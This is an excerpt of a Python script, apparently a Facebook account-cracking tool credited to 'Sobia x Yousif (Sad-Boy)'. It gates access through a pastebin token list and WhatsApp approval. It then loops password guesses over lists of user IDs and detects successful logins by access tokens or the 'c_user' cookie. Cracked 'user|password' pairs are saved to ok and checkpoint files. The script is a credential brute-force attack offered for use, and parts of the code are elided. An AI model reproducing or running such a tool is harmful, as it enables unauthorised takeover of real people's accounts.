...
|Author   | Sobia x Yousif (Sad-Boy)      |
|Fb Id    | Sobia x Yousif Sad Boy        |
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://pastebin.com/2ceqHj0i.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        ...
        print(' WhatsApp : +923312734753')
        input('\033[1;97m Press Enter To Send Token')
        os.system('xdg-open https://wa.me/+923312734753?text=Assalamualaikum Sir Approve my Token and my Token :'+to)
        reg()
...
def reg2():
    ...
    os.system('xdg-open https://wa.me/+923312734753?text=Assalamualaikum Sir Approve my Token and my Token :'+id)
...
def hasil(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        ...
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mJAI-ok.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mJAI-cp.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [JAI] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                print('\r [SUCCESS JAI] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CHECK JAI] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f'\r{H} [JAI SUCCESSFUL] {user} | {pw}')
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('bsn-ok.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s \033[1;91m[JAI CHECKPOINT] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('bsn-cp.txt' , 'a').write('%s\n' % wrt)
                        break
